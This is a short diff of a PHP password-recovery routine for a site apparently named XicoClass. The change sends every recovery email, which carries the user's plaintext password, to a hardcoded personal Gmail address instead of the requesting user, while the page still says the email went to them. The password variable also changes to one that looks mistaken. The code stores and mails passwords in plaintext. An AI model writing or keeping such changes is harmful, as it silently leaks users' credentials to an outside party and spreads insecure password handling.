@@ -46,9 +46,9 @@ function permisos() {
           echo "¡El correo no existe!";
           }else{
             $from = "administradores@xicoclass.online";
-            $to = $mail;
+            $to = "gib.aran5@gmail.com";
             $subject = "Tu contraseña XicoClass";
-            $message = "Hola, Aquí tienes tu contraseña: ".$consulta2['contraseña'];
+            $message = "Hola, Aquí tienes tu contraseña: ".$sql['contraseña'];
             $headers = "De:" . $from;
             mail($to,$subject,$message, $headers);
               echo "¡Hemos enviado un correo con tu contraseña!";
